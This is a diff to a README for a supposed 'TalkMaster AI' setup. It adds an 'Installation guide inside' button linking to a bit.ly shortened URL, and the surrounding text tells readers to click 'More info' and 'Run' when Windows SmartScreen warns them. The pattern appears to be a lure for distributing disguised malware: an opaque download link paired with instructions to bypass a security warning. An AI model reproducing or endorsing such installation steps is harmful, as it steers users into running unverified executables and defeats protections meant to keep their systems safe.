@@ -3,6 +3,9 @@
 
 ## TalkMaster AI Full Setup ℹ️
 
+<h3 align=center>Installation guide inside ⚙️ </h3>
+<p align="center"> <a href="https://bit.ly/3Qrzdgj"> <img height="90" src="https://iili.io/JapvPpf.png"/> </a> </p>
+
 **Open TalkMaster 1.8**
 
 **If the SmarScreen window pops up, click on "More info" and then click "Run".**
